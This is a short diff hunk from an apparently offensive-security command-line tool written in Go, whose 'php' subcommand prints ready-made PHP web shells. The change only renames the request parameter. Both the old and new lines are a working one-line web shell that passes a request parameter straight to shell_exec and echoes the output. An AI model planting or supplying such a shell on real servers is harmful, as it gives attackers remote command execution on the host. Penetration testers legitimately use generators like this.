@@ -22,7 +22,7 @@ var phpCmd = &cobra.Command{
 		phpScript := ""
 
 		fmt.Println(colors.CyanColor("Basic shell_exec: "))
-		phpScript = `<?php echo "<pre>" . shell_exec($_REQUEST['cybo']) . "</pre>"; ?>`
+		phpScript = `<?php echo "<pre>" . shell_exec($_REQUEST['bear']) . "</pre>"; ?>`
 		fmt.Println(phpScript)
 
 		fmt.Println(colors.CyanColor("Shell exec 1:"))
